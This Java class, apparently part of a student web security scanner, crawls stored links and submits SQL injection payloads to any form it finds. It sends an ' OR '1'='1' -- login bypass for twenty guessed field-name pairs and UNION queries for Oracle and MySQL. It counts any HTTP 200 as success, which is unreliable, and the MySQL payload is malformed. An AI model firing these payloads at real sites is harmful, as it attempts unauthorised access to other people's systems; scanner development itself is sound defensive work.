/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package org.daiict.mscit.pl1.wasc.security;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import org.daiict.mscit.pl1.wasc.entities.*;
import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.helper.HttpConnection;
import org.jsoup.nodes.Document;
import org.jsoup.select.Elements;
import org.jsoup.nodes.Element;

/**
 *
 * @author VJ
 */
public class SQLInjector {

    //how wud you pass the links to the sqlinjector to start doing its procedure?
    //central link store???
    //method that checks whether the link has a form or not.
    //a function to check what kind of form it is, i.e. login form or register kind of.
    //if yes then a nother method will do (various) sql injection(/s) on it.
    //if success then it will further crawl to new discovered pages behing the sql injected response page
    //follow the same procedure
    //public static boolean 
    private LinkStore linkStore = null;

    public LinkStore getLinkStore() {
        return linkStore;
    }
    private List<Report> Report = null;

    public List<Report> getReport() {
        return Report;
    }

    public SQLInjector(LinkStore linkstore) {
        this.linkStore = linkstore;
        this.Report = new ArrayList<Report>();
    }

    public boolean testAll() {
        boolean result = false;

        for (Link l : linkStore.getStore().values()) {
            result = testOneEqualToOne(l);
            result = testRegisterUnion(l);
        }
        return result;
    }

    public boolean test(Link link) {

        try {

            Document doc = Jsoup.connect(link.getURL()).get();
            Elements forms = doc.select("form[action]");
            if (forms.isEmpty()) {
                return false;
            }

            Element form = forms.first();
            Elements textboxes = form.getElementsByAttributeValue("type", "text");
            Elements hidden = form.select("input[type=hidden]");
            String submitURL = form.attr("abs:action");

            HttpConnection.Response res = null;
            int statusCode;
            Document responseDoc = null;

            Report r = new Report(link.getID());

            Connection con = Jsoup.connect(submitURL).ignoreContentType(true).ignoreHttpErrors(true);

            for (Element e : hidden) {
                con.data(e.attr("name"), e.attr("value"));
            }

            if (form.getElementsByAttributeValue("type", "password").first() != null) {  //it means the form is a login form.. ;)
                return testOneEqualToOne(link);
            } else {// its a registration form..

                boolean result = testRegisterUnion(link);
                
                return result;
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return false;
    }

    public boolean testOneEqualToOne(Link link) {

        try {

            Document doc = Jsoup.connect(link.getURL()).get();
            Elements forms = doc.select("form[action]");

            Element form = forms.first();
            Elements textboxes = form.getElementsByAttributeValue("type", "text");
            Elements hidden = form.select("input[type=hidden]");
            String submitURL = form.attr("abs:action");

            HttpConnection.Response res = null;
            int statusCode;
            Document responseDoc = null;

            Report r = new Report(link.getID());
            r.setReport(" ");

            Connection con = Jsoup.connect(submitURL).ignoreContentType(true).ignoreHttpErrors(true);

            for (Element e : hidden) {
                con.data(e.attr("name"), e.attr("value"));
            }


            //20 combinations of username password..
            //<editor-fold>
            if ((form.getElementsByAttributeValue("name", "username").first() != null) && (form.getElementsByAttributeValue("name", "password").first() != null)) {
                con = con.data("username", "' OR '1'='1'  -- '", "password", "");
            }
            if ((form.getElementsByAttributeValue("name", "username").first() != null) && (form.getElementsByAttributeValue("name", "passwd").first() != null)) {
                con = con.data("username", "' OR '1'='1'  -- '", "passwd", "");
            }
            if ((form.getElementsByAttributeValue("name", "username").first() != null) && (form.getElementsByAttributeValue("name", "pass").first() != null)) {
                con = con.data("username", "' OR '1'='1'  -- '", "pass", "");
            }
            if ((form.getElementsByAttributeValue("name", "username").first() != null) && (form.getElementsByAttributeValue("name", "pwd").first() != null)) {
                con = con.data("username", "' OR '1'='1'  -- '", "pwd", "");
            }
            if ((form.getElementsByAttributeValue("name", "usernm").first() != null) && (form.getElementsByAttributeValue("name", "password").first() != null)) {
                con = con.data("usernm", "' OR '1'='1'  -- '", "password", "");
            }
            if ((form.getElementsByAttributeValue("name", "usernm").first() != null) && (form.getElementsByAttributeValue("name", "passwd").first() != null)) {
                con = con.data("usernm", "' OR '1'='1'  -- '", "passwd", "");
            }
            if ((form.getElementsByAttributeValue("name", "usernm").first() != null) && (form.getElementsByAttributeValue("name", "pass").first() != null)) {
                con = con.data("usernm", "' OR '1'='1'  -- '", "pass", "");
            }
            if ((form.getElementsByAttributeValue("name", "usernm").first() != null) && (form.getElementsByAttributeValue("name", "pwd").first() != null)) {
                con = con.data("usernm", "' OR '1'='1'  -- '", "pwd", "");
            }
            if ((form.getElementsByAttributeValue("name", "uname").first() != null) && (form.getElementsByAttributeValue("name", "password").first() != null)) {
                con = con.data("uname", "' OR '1'='1'  -- '", "password", "");
            }
            if ((form.getElementsByAttributeValue("name", "uname").first() != null) && (form.getElementsByAttributeValue("name", "passwd").first() != null)) {
                con = con.data("uname", "' OR '1'='1'  -- '", "passwd", "");
            }
            if ((form.getElementsByAttributeValue("name", "uname").first() != null) && (form.getElementsByAttributeValue("name", "pass").first() != null)) {
                con = con.data("uname", "' OR '1'='1'  -- '", "pass", "");
            }
            if ((form.getElementsByAttributeValue("name", "uname").first() != null) && (form.getElementsByAttributeValue("name", "pwd").first() != null)) {
                con = con.data("uname", "' OR '1'='1'  -- '", "pwd", "");
            }
            if ((form.getElementsByAttributeValue("name", "user").first() != null) && (form.getElementsByAttributeValue("name", "password").first() != null)) {
                con = con.data("user", "' OR '1'='1'  -- '", "password", "");
            }
            if ((form.getElementsByAttributeValue("name", "user").first() != null) && (form.getElementsByAttributeValue("name", "passwd").first() != null)) {
                con = con.data("user", "' OR '1'='1'  -- '", "passwd", "");
            }
            if ((form.getElementsByAttributeValue("name", "user").first() != null) && (form.getElementsByAttributeValue("name", "pass").first() != null)) {
                con = con.data("user", "' OR '1'='1'  -- '", "pass", "");
            }
            if ((form.getElementsByAttributeValue("name", "user").first() != null) && (form.getElementsByAttributeValue("name", "pwd").first() != null)) {
                con = con.data("user", "' OR '1'='1'  -- '", "pwd", "");
            }
            if ((form.getElementsByAttributeValue("name", "unm").first() != null) && (form.getElementsByAttributeValue("name", "password").first() != null)) {
                con = con.data("unm", "' OR '1'='1'  -- '", "password", "");
            }
            if ((form.getElementsByAttributeValue("name", "unm").first() != null) && (form.getElementsByAttributeValue("name", "passwd").first() != null)) {
                con = con.data("unm", "' OR '1'='1'  -- '", "passwd", "");
            }
            if ((form.getElementsByAttributeValue("name", "unm").first() != null) && (form.getElementsByAttributeValue("name", "pass").first() != null)) {
                con = con.data("unm", "' OR '1'='1'  -- '", "pass", "");
            }
            if ((form.getElementsByAttributeValue("name", "unm").first() != null) && (form.getElementsByAttributeValue("name", "pwd").first() != null)) {
                con = con.data("unm", "' OR '1'='1'  -- '", "pwd", "");
            }
            //</editor-fold>

            //dropping the idea of regex username password and sticking to 20 combinations we thought of; for the time being.
            //String Uregex="[t[e]xt][u][s][e][r]n[a]m[e]{3,12}";
            //String Pregex="[t[e]xt]p[a][s][s][w][o][r][d]{3,12}";


            res = (HttpConnection.Response) con.execute();

            statusCode = res.statusCode();
            switch (statusCode) {
                case 200:
                    r.setReport(r.getReport() + "OR 1=1 SQL Injection Successful.");
                    System.out.println("yippee !");
                    break;
                default:
                    r.setReport(r.getReport() + "OR 1=1 SQL Injection Unsuccessful.");
                    System.out.println(":(");
                    break;
            }
            int index = this.Report.indexOf(r);
            if (index >= 0) {
                this.Report.get(index).setReport(r.getReport());
            } else {
                this.Report.add(r);
            }

            //System.out.println("Status Code : " + statusCode);
            //System.out.println(responseDoc.toString());

            return (statusCode == 200 ? true : false);

        } catch (Exception ex) {
            ex.printStackTrace();
        }

        return false;
    }

    public boolean testRegisterUnion(Link link) {

        try {
            Document doc = Jsoup.connect(link.getURL()).get();
            Elements forms = doc.select("form[action]");

            Element form = forms.first();
            Elements textboxes = form.getElementsByAttributeValue("type", "text");
            Elements hidden = form.select("input[type=hidden]");
            String submitURL = form.attr("abs:action");

            HttpConnection.Response res = null;
            int statusCode;
            Document responseDoc = null;

            Report r = new Report(link.getID());

            Connection con = Jsoup.connect(submitURL).ignoreContentType(true).ignoreHttpErrors(true);

            for (Element e : hidden) {
                con.data(e.attr("name"), e.attr("value"));
            }

            //UNION Query for Oracle

            con.data(textboxes.get(0).attr("name"), "' UNION Select * from ALL_TABLES -- ");
            for (int i = 1; i < textboxes.size(); i++) {
                con.data(textboxes.get(i).attr("name"), "");
            }

            res = (HttpConnection.Response) con.execute();

            statusCode = res.statusCode();
            switch (statusCode) {
                case 200:
                    r.setReport(r.getReport() + "UNION Query SQL Injection Successful.\n");
                    break;
                default:
                    r.setReport(r.getReport() + "UNION Query SQL Injection Unsuccessful.\n");
                    break;
            }

            int index = this.Report.indexOf(r);
            if (index >= 0) {
                this.Report.get(index).setReport(r.getReport());
            } else {
                this.Report.add(r);
            }

            //responseDoc = res.parse();
            System.out.println("Status Code : " + statusCode);
            //System.out.println(responseDoc.toString());

            if (statusCode == 200) {
                return true;
            }

            //UNION Query for mysql

            con = Jsoup.connect(submitURL).ignoreContentType(true).ignoreHttpErrors(true);

            for (Element e : hidden) {
                con.data(e.attr("name"), e.attr("value"));
            }

            con.data(textboxes.get(0).attr("name"), "' UNION Show TABLES where 'x'=='x' -- ");
            for (int i = 1; i < textboxes.size(); i++) {
                con.data(textboxes.get(i).attr("name"), "");
            }

            res = (HttpConnection.Response) con.execute();

            statusCode = res.statusCode();
            switch (statusCode) {
                case 200:
                    r.setReport(r.getReport() + "UNION Query SQL Injection Successful.\n");
                    break;
                default:
                    r.setReport(r.getReport() + "UNION Query SQL Injection Unsuccessful.\n");
                    break;
            }

            index = this.Report.indexOf(r);
            if (index >= 0) {
                this.Report.get(index).setReport(r.getReport());
            } else {
                this.Report.add(r);
            }

            //responseDoc = res.parse();
            System.out.println("Status Code : " + statusCode);
            //System.out.println(responseDoc.toString());

            if (statusCode == 200) {
                return true;
            }

        } catch (Exception ex) {
        }

        return false;
    }
    
    
    
    public void dummmy(Link link){//ignore this method,, just a dummy method to debug..
        try {

            Document doc = Jsoup.connect(link.getURL()).get();
            Elements forms = doc.select("form[action]");

            Element form = forms.first();
            Elements textboxes = form.getElementsByAttributeValue("type", "text");
            Elements hidden = form.select("input[type=hidden]");
            String submitURL = form.attr("abs:action");

            HttpConnection.Response res = null;
            int statusCode;
            Document responseDoc = null;

            Report r = new Report(link.getID());
            r.setReport(" ");

            Connection con = Jsoup.connect(submitURL).ignoreContentType(true).ignoreHttpErrors(true);

            for (Element e : hidden) {
                con.data(e.attr("name"), e.attr("value"));
            }

            Element tempUElement=null,tempPElement=null;

            //20 combinations of username password..
            //<editor-fold>
            if ((form.getElementsByAttributeValue("name", "username").first() != null) && (form.getElementsByAttributeValue("name", "password").first() != null)) {
                con = con.data("username", "' OR '1'='1'  -- '", "password", "");
            }
            if ((form.getElementsByAttributeValue("name", "username").first() != null) && (form.getElementsByAttributeValue("name", "passwd").first() != null)) {
                con = con.data("username", "' OR '1'='1'  -- '", "passwd", "");
            }
            if ((form.getElementsByAttributeValue("name", "username").first() != null) && (form.getElementsByAttributeValue("name", "pass").first() != null)) {
                con = con.data("username", "' OR '1'='1'  -- '", "pass", "");
            }
            if ((form.getElementsByAttributeValue("name", "username").first() != null) && (form.getElementsByAttributeValue("name", "pwd").first() != null)) {
                con = con.data("username", "' OR '1'='1'  -- '", "pwd", "");
            }
            if ((form.getElementsByAttributeValue("name", "usernm").first() != null) && (form.getElementsByAttributeValue("name", "password").first() != null)) {
                con = con.data("usernm", "' OR '1'='1'  -- '", "password", "");
            }
            if ((form.getElementsByAttributeValue("name", "usernm").first() != null) && (form.getElementsByAttributeValue("name", "passwd").first() != null)) {
                con = con.data("usernm", "' OR '1'='1'  -- '", "passwd", "");
            }
            if ((form.getElementsByAttributeValue("name", "usernm").first() != null) && (form.getElementsByAttributeValue("name", "pass").first() != null)) {
                con = con.data("usernm", "' OR '1'='1'  -- '", "pass", "");
            }
            if ((form.getElementsByAttributeValue("name", "usernm").first() != null) && (form.getElementsByAttributeValue("name", "pwd").first() != null)) {
                con = con.data("usernm", "' OR '1'='1'  -- '", "pwd", "");
            }
            if ((form.getElementsByAttributeValue("name", "uname").first() != null) && (form.getElementsByAttributeValue("name", "password").first() != null)) {
                con = con.data("uname", "' OR '1'='1'  -- '", "password", "");
            }
            if ((form.getElementsByAttributeValue("name", "uname").first() != null) && (form.getElementsByAttributeValue("name", "passwd").first() != null)) {
                con = con.data("uname", "' OR '1'='1'  -- '", "passwd", "");
            }
            if ((form.getElementsByAttributeValue("name", "uname").first() != null) && (form.getElementsByAttributeValue("name", "pass").first() != null)) {
                con = con.data("uname", "' OR '1'='1'  -- '", "pass", "");
                System.out.println(form.getElementsByAttributeValue("name", "uname").first().text());
                System.out.println(form.getElementsByAttributeValue("name", "pass").first().text());
                
            }
            if ((form.getElementsByAttributeValue("name", "uname").first() != null) && (form.getElementsByAttributeValue("name", "pwd").first() != null)) {
                con = con.data("uname", "' OR '1'='1'  -- '", "pwd", "");
            }
            if ((form.getElementsByAttributeValue("name", "user").first() != null) && (form.getElementsByAttributeValue("name", "password").first() != null)) {
                con = con.data("user", "' OR '1'='1'  -- '", "password", "");
            }
            if ((form.getElementsByAttributeValue("name", "user").first() != null) && (form.getElementsByAttributeValue("name", "passwd").first() != null)) {
                con = con.data("user", "' OR '1'='1'  -- '", "passwd", "");
            }
            if ((form.getElementsByAttributeValue("name", "user").first() != null) && (form.getElementsByAttributeValue("name", "pass").first() != null)) {
                con = con.data("user", "' OR '1'='1'  -- '", "pass", "");
            }
            if ((form.getElementsByAttributeValue("name", "user").first() != null) && (form.getElementsByAttributeValue("name", "pwd").first() != null)) {
                con = con.data("user", "' OR '1'='1'  -- '", "pwd", "");
            }
            if ((form.getElementsByAttributeValue("name", "unm").first() != null) && (form.getElementsByAttributeValue("name", "password").first() != null)) {
                con = con.data("unm", "' OR '1'='1'  -- '", "password", "");
            }
            if ((form.getElementsByAttributeValue("name", "unm").first() != null) && (form.getElementsByAttributeValue("name", "passwd").first() != null)) {
                con = con.data("unm", "' OR '1'='1'  -- '", "passwd", "");
            }
            if ((form.getElementsByAttributeValue("name", "unm").first() != null) && (form.getElementsByAttributeValue("name", "pass").first() != null)) {
                con = con.data("unm", "' OR '1'='1'  -- '", "pass", "");
            }
            if ((form.getElementsByAttributeValue("name", "unm").first() != null) && (form.getElementsByAttributeValue("name", "pwd").first() != null)) {
                con = con.data("unm", "' OR '1'='1'  -- '", "pwd", "");
            }
            //</editor-fold>

            //dropping the idea of regex username password and sticking to 20 combinations we thought of; for the time being.
            //String Uregex="[t[e]xt][u][s][e][r]n[a]m[e]{3,12}";
            //String Pregex="[t[e]xt]p[a][s][s][w][o][r][d]{3,12}";


            res = (HttpConnection.Response) con.execute();

            statusCode = res.statusCode();
            switch (statusCode) {
                case 200:
                    r.setReport(r.getReport() + "OR 1=1 SQL Injection Successful.");
                    System.out.println("yippee !");
                    break;
                default:
                    r.setReport(r.getReport() + "OR 1=1 SQL Injection Unsuccessful.");
                    System.out.println(":(");
                    break;
            }
            int index = this.Report.indexOf(r);
            if (index >= 0) {
                this.Report.get(index).setReport(r.getReport());
            } else {
                this.Report.add(r);
            }

            System.out.println("Status Code : " + statusCode);
            //System.out.println(responseDoc.toString());

            //return (statusCode == 200 ? true : false);

        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
